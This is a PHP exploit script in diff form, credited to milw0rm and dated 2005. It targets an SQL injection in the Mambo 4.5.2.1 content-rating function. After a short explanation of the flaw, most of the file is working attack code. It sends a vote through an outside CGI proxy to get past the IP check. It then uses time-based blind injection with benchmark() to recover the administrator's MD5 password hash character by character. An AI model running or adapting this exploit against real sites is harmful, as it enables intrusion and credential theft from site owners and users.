@@ -1,0 +1,206 @@
+#!/usr/bin/php -q
+Mambo 4.5.2.1 + mysql 4.1 > fetch password hash by pokleyzz <pokleyzz at scan-associates.net>
+
+<?php
+/*
+Mambo 4.5.2.1 + mysql 4.1 > fetch password hash by pokleyzz <pokleyzz at scan-associates.net>
+*content rating using sub query to select from mos_users
+
+Requirement:
+
+	PHP 4.x with curl extension
+
+Description:
+
+The problem occur because $user_rating variable is not properly sanitize when for use in SQL query
+for UPDATE statement. 
+
+>From content.php (components\com_content\content.php)
+-----
+function recordVote ( $url, $user_rating, $cid, $database ){
+	$cid = intval( $cid );
+  
+	if ( ( $user_rating >= 1 ) and ( $user_rating <= 5 ) ) { <--- 1st Checkpoint
+		$currip = getenv( 'REMOTE_ADDR' );
+
+		$query = "SELECT * FROM #__content_rating WHERE content_id = $cid";
+		$database->setQuery( $query );
+		$votesdb = NULL;
+		
+		if ( !( $database->loadObject( $votesdb ) ) ) {
+			$query = "INSERT INTO #__content_rating ( content_id, lastip, rating_sum, rating_count )"
+			. "\n VALUES ( '$cid', '$currip', '$user_rating', '1' )";
+			$database->setQuery( $query );
+			$database->query() or die( $database->stderr() );;
+		} else {
+			if ($currip <> ($votesdb->lastip)) { <-- 2nd Checkpoint
+				
+				$query = "UPDATE #__content_rating"
+				. "\n SET rating_count = rating_count + 1,"
+				. "\n rating_sum = rating_sum + $user_rating," <--- PROBLEM
+				. "\n lastip = '$currip'"
+				. "\n WHERE content_id = ". $cid
+				;
+				$database->setQuery( $query );
+				$database->query() or die( $database->stderr() );
+			} else {
+				mosRedirect ( $url, _ALREADY_VOTE );
+			}
+		}
+		mosRedirect ( $url, _THANKS );
+	}
+}
+-----
+User may escape 1st checkpoint by passing (1-5)(string) value to $user_rating .In PHP beginning
+number in string will be use when comparing number with string.
+
+The 2nd checkpoint will check previous user's ip rated the content. Update statement will only 
+execute when previous ip is different from current ip. This proof of concept will use cgi proxy from 
+http://projectbypass.com to make it possible.
+
+In mySQL 4.1 and above it is possible to use "sub select" in any SQL statement. We will using 
+"blind fishing" with sub select to fetch password hash (md5) for supplied user id. 
+
+Exploiting step:
+
+1) rate from different ip
+2) check time for standard page loading
+3) check time for page loading when benchmark executed.
+		* If error occur mysql version is < 4.1 (no support for sub select)
+4) double the benchmark value. Blind fishing will use this value to do the query.
+5) blind fishing with sub select.
+
+Special thanks:
+
+al3ndaleeb at hotmail.com
+
+*/
+
+if (!(function_exists('curl_init'))) {
+	echo "cURL extension required\n";
+	exit;
+}
+
+ini_set("max_execution_time","999999");
+ 
+$benchcount = 150000;
+$aid= 62;
+$cid = 2;
+$charmap = array (48,49,50,51,52,53,54,55,56,57,
+		  97,98,99,100,101,102,
+		  103,104,105,
+		  106,107,108,109,110,111,112,113,
+		  114,115,116,117,118,119,120,121,122
+		  );
+		  
+if($argv[1]){	
+	$url = $argv[1];
+	if ($argv[2])
+		$aid = $argv[2];
+	if ($argv[3])
+		$benchcount = $argv[3];
+	if ($argv[4])
+		$proxy = $argv[4]; 
+}
+else {
+	echo "Usage: ".$argv[0]." <URL> [userid] [benchmarkcount] [proxy]\n\n";
+	echo "\tURL\t URL to mambo site (ex: http://127.0.0.1)\n";
+	echo "\taid\t userid to get  (default: 62 (admin))\n";
+	echo "\tbenchmarkcount\t benchmark count  (default: 150000)\n";
+	echo "\tproxy\t optional proxy url  (ex: http://10.10.10.10:8080)\n"; 
+	exit;
+}
+
+
+
+// rate from different ip (using http://projectbypass.com)
+
+$projectbypass = "http://projectbypass.com/nph-proxy3.cgi/010110A/";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$projectbypass.str_replace("://","/",$url)."/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res = curl_exec($ch);
+curl_close ($ch);
+
+// standard page loading time
+$start = time();
+$ch = curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res  = curl_exec($ch);
+curl_close ($ch);
+$stop = time();
+$sloadtime = floatval($stop - $start);
+echo "standard page loading =".$sloadtime."\n"; 
+
+// benchmark page loading time
+$start = time();
+$ch = curl_init();
+if ($proxy){
+	curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+}
+curl_setopt($ch, CURLOPT_URL,$url."/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1,rating_sum=(select+1+from+mos_users+where+if(2>1,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+$res = curl_exec($ch);
+curl_close ($ch);
+$stop = time();
+$bloadtime = floatval($stop - $start);
+echo "bencmark page loading =".$bloadtime."\n"; 
+
+// check if SQL query failed
+if (ereg("DB function failed",$res)){
+	echo "[x] mysql < 4.1 detected - not exploitable\n";
+	exit();
+}
+
+if ($bloadtime <= $sloadtime + 2){
+	echo "[x] increase your benchmark count\n";
+	exit();
+}
+
+echo "Take your time for Teh Tarik... please wait ...\n\n";
+echo "Result:\n";
+echo "\tUserid = $aid\n";
+echo "\tPassword Hash = ";
+
+// starting fetch password
+
+$benchcount = $benchcount*2;
+		
+for($i= 1;$i< 33;$i++){ 
+	foreach ($charmap as $char){
+		$start = time();
+		echo chr($char);
+		$ch = curl_init();
+		if ($proxy){
+			curl_setopt($ch, CURLOPT_PROXY,$proxy); 
+		}
+		curl_setopt($ch, CURLOPT_URL,$url."/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1,rating_sum=(select+password+from+mos_users+where+id=$aid+and+if(ascii(substring(password,$i,1))=$char,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*");
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+		$res=curl_exec ($ch);
+		curl_close ($ch);
+		$stop = time();
+		$xloadtime = floatval($stop - $start);
+		if (floatval($xloadtime) > $bloadtime){
+			$hash .= chr($char);
+			break 1;
+		}
+		else {
+			echo chr(8);
+		}
+		
+		if ($char == 103){
+			echo "\n\n\tNot Vulnerable or Something wrong occur ...\n";
+			exit;
+		}
+		
+	}
+}
+echo "\n";
+
+?>
+
+// milw0rm.com [2005-06-15]
